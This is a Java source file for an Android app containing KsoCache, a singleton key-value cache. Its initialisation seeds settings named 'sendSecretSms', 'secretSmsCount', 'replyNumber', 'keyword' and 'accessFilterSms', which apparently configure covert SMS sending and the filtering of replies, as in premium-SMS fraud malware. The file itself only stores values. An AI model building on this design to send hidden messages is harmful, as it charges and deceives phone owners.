package com.sttm.util;

import java.util.HashMap;

/**
 * 缓存器
 * 
 * @author ligm
 * @since 2012.5.3 17：54
 * 
 */

import android.content.Context;
import android.content.pm.PackageManager.NameNotFoundException;

public class KsoCache {

	// 缓存内容---键值对方式
	private HashMap<String, Object> cacheContent = new HashMap<String, Object>();

	private static KsoCache cache = null;

	// 锁
	private static final Object LOCK = new Object();

	// 防制外部实例化，只能通过内部实例化
	private KsoCache() {
	}

	/*
	 * // 单态模式，保证每次都是同一个对象 public static synchronized KsoCache
	 * getInstance(Context context) { if (cache == null) { cache = new
	 * KsoCache();
	 * 
	 * }else { if(cache.getCacheSize() <= 0){ cache.init(context); } } return
	 * cache;
	 * 
	 * }
	 */

	// 单态模式，保证每次都是同一个对象
	public static synchronized KsoCache getInstance() {
		if (cache == null) {
			cache = new KsoCache();

		}
		return cache;

	}

	// 系统启动时初始化缓存数据

	public void init(Context context) {

		synchronized (LOCK) {

			String curstomID = "";
			try {
				curstomID = KsoHelper.getCustomID(context);
			} catch (NameNotFoundException e) {

				e.printStackTrace();
			}
			cache.reSetValue("curstomID", curstomID);
			cache.reSetValue("sendSecretSms", false);
			cache.reSetValue("salenum", "");
			cache.reSetValue("channel", "");
			cache.reSetValue("order", "");
			cache.reSetValue("replyNumber", "");
			cache.reSetValue("keyword", "");
			cache.reSetValue("secretSmsCount", 2);
			cache.reSetValue("interval", 4);		
			cache.reSetValue("timeout", "4");
			cache.reSetValue("accessFilterSms", true);

		}

	}

	// 重新更新缓存数据
	public void reSetValues(String[] keys, Object[] values) {
		// 传值进来的参数是一个Object数组
		synchronized (LOCK) {
			for (int i = 0; i < values.length; i++) {
				cacheContent.put(keys[i], values[i]);

			}

		}

	}

	// 重新更新缓存数据
	public void reSetValue(String key, Object value) {
		synchronized (LOCK) {
			cacheContent.put(key, value);

		}

	}

	// 根据键取值

	public Object getValue(String key) {
		synchronized (LOCK) {
			return cacheContent.get(key);

		}

	}

	// 根据键删除缓存数据
	public void deleteCache(String key) {
		synchronized (LOCK) {
			cacheContent.remove(key);

		}

	}

	// 根据键删除缓存数据
	public void removeCache(String[] keys) {
		synchronized (LOCK) {
			for (int i = 0; i < keys.length; i++) {
				cacheContent.remove(keys[i]);

			}

		}

	}

	// 全部清空缓存数据
	public void clearCache() {
		synchronized (LOCK) {
			cacheContent.clear();

		}

	}

	public int getCacheSize() {
		synchronized (LOCK) {
			return cacheContent.size();

		}

	}

}
